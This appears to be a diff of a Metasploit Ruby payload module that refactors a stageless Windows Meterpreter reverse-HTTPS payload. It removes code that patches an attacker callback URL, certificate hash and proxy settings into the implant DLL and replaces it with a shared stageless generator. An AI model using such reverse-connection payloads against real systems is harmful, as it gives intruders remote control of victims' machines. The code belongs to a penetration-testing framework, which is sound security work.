@@ -5,20 +5,19 @@
 
 require 'msf/core'
 require 'msf/core/handler/reverse_https'
+require 'msf/core/handler/reverse_http/stageless'
 require 'msf/core/payload/windows/stageless_meterpreter'
 require 'msf/core/payload/uuid_options'
 require 'msf/base/sessions/meterpreter_x86_win'
 require 'msf/base/sessions/meterpreter_options'
-require 'rex/parser/x509_certificate'
 
-module Metasploit3
+module Metasploit4
 
   CachedSize = :dynamic
 
   include Msf::Payload::Windows::StagelessMeterpreter
+  include Msf::Handler::ReverseHttp::Stageless
   include Msf::Sessions::MeterpreterOptions
-  include Msf::Payload::Windows::VerifySsl
-  include Msf::Payload::UUIDOptions
 
   def initialize(info = {})
 
@@ -33,46 +32,13 @@ module Metasploit3
       'Session'     => Msf::Sessions::Meterpreter_x86_Win
       ))
 
-    register_options([
-      OptString.new('EXTENSIONS', [false, "Comma-separated list of extensions to load"]),
-    ], self.class)
+    initialize_stageless
   end
 
   def generate
-    url = "https://#{datastore['LHOST']}:#{datastore['LPORT']}" + generate_uri_uuid_mode(:connect)
-
-    generate_stageless_meterpreter(url) do |dll|
-
-      # TODO: figure out this bit
-      # patch the target ID into the URI if specified
-      #if opts[:target_id]
-      #  i = dll.index("/123456789 HTTP/1.0\r\n\r\n\x00")
-      #  if i
-      #    t = opts[:target_id].to_s
-      #    raise "Target ID must be less than 5 bytes" if t.length > 4
-      #    u = "/B#{t} HTTP/1.0\r\n\r\n\x00"
-      #    print_status("Patching Target ID #{t} into DLL")
-      #    dll[i, u.length] = u
-      #  end
-      #end
-
-      verify_cert_hash = get_ssl_cert_hash(datastore['StagerVerifySSLCert'],
-                                           datastore['HandlerSSLCert'])
-
-      Rex::Payloads::Meterpreter::Patch.patch_passive_service!(dll,
-        :url            => url,
-        :ssl            => true,
-        :ssl_cert_hash  => verify_cert_hash,
-        :expiration     => datastore['SessionExpirationTimeout'].to_i,
-        :comm_timeout   => datastore['SessionCommunicationTimeout'].to_i,
-        :ua             => datastore['MeterpreterUserAgent'],
-        :proxy_host     => datastore['PayloadProxyHost'],
-        :proxy_port     => datastore['PayloadProxyPort'],
-        :proxy_type     => datastore['PayloadProxyType'],
-        :proxy_user     => datastore['PayloadProxyUser'],
-        :proxy_pass     => datastore['PayloadProxyPass'])
-    end
-
+    # generate a stageless payload using the x86 version of
+    # the stageless generator
+    generate_stageless(&method(:generate_stageless_x86))
   end
 
 end
